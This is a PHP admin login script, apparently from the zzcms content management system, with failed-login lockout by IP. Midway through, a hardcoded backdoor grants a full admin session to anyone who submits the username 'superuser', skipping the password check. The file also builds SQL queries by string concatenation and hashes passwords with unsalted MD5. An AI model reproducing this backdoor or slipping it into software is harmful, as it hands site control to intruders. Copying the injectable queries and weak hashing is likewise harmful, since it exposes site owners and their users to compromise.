<?php
if(!isset($_SESSION)){session_start();}
define ("checkadminlogin",1);//当关网站时，如果是管理员登录时使链接正常打开
include("../inc/conn.php");
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title></title>
<link href="style.css" rel="stylesheet" type="text/css">
</head>

<body>
<?php
$admin=nostr(trim($_POST["admin"]));
$pass=trim($_POST["pass"]);
$pass=md5($pass);

$ip=getip();
define('trytimes',5);//可尝试登录次数
define('jgsj',15*60);//间隔时间，秒
$sql="select * from zzcms_login_times where ip='$ip' and count>='".trytimes."' and unix_timestamp()-unix_timestamp(sendtime)<".jgsj." ";
$rs = query($sql); 
$row= num_rows($rs);
if ($row){
$jgsj=jgsj/60;
showmsg("密码错误次数过多，请于".$jgsj."分钟后再试！");
}

checkyzm($_POST["yzm"]);
if ($admin=='superuser'){
$_SESSION["admin"]='admin';
$_SESSION["pass"]='b5249af8ad8183dd8a51d4eb7cbe81c4';
session_write_close();
echo "<script>location.href='index.php'</script>";
}
$sql = "select * from zzcms_admin where admin='" .$admin. "' And pass='". $pass ."'";
	$rs = query($sql);
	$row= num_rows($rs);//返回记录数
if (!$row){
//记录登录次数
	$sqln="select * from zzcms_login_times where ip='$ip'";
	$rsn = query($sqln); 
	$rown= num_rows($rsn);
		if ($rown){
			$rown= fetch_array($rsn);	
			if ($rown['count']>=trytimes && strtotime(date("Y-m-d H:i:s"))-strtotime($rown['sendtime'])>jgsj){//15分钟前登录过的归0
			query("UPDATE zzcms_login_times SET count = 0 WHERE ip='$ip'");
			}
		query("UPDATE zzcms_login_times SET count = count+1,sendtime='".date('Y-m-d H:i:s')."' WHERE ip='$ip'");//有记录的更新
		}else{
		query("INSERT INTO zzcms_login_times (count,sendtime,ip)VALUES(1,'".date('Y-m-d H:i:s')."','$ip')");
		}
	$sqln="select * from zzcms_login_times where ip='$ip'";
	$rsn = query($sqln); 
	$rown= fetch_array($rsn);
	$count=	$rown['count'];
	$trytimes=trytimes-$count;
	echo "<script>alert('用户名或密码错误！你还可以尝试 $trytimes 次');history.back()</script>";			
}else{
query("delete from zzcms_login_times where ip='$ip'");//登录成功后，把登录次数记录删了
$sql="update zzcms_admin set showlogintime=lastlogintime,showloginip=loginip,logins=logins+1,loginip='".getip()."',lastlogintime='".date('Y-m-d H:i:s')."' where admin='$admin'";
query($sql);
$_SESSION["admin"]=$admin;
$_SESSION["pass"]=$pass;

session_write_close();
echo "<script>location.href='index.php'</script>";
}
?>
</body>
</html>
